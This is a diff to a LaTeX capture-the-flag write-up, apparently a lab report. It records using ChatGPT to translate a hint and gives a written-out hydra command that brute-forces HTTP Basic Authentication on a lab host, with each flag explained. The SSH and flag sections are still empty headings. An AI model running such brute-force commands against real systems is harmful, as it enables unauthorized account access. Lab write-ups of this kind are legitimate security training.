@@ -161,15 +161,25 @@ done
 	\centering
 	\caption{Running the script}
 \end{figure}\abc
-
-\begin{figure}[h]
+After running it for a while, we prompted ChatGPT with the list of outputs to translate, which revealed the following hint, as shown in Figure 11.
+\begin{figure}[ht]
 	\includegraphics[scale=0.4]{images/labngs.png}
 	\centering
-	\caption{Running the script}
+	\caption{ChatGPT translating the hint}
 \end{figure}\abc
 \subsection{Weaponization: Evaluating the needed tools}
-
-\subsection{breaking the http authtication}
+Now that we know the username and that it uses HTTP Basic Authentication, we can use Hydra to brute-force the password. For this, I have chosen the 10-million-password list as our wordlist \cite{pw-list}
+\subsection{Exploitation: Using Hydra to break HTTP basic authentication}
+To brute force the password, the following \texttt{hydra} command will be used: \texttt{hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /}
+Here is a breakdown of the options used in the command:
+\begin{lstlisting}
+-l user
+-P pw.txt
+-s 55487
+-f
+192.168.15.3
+http-get /
+\end{lstlisting}
 \subsection{sshing into the server}
 \subsection{exploring the system}
 \subsection{procces flag}
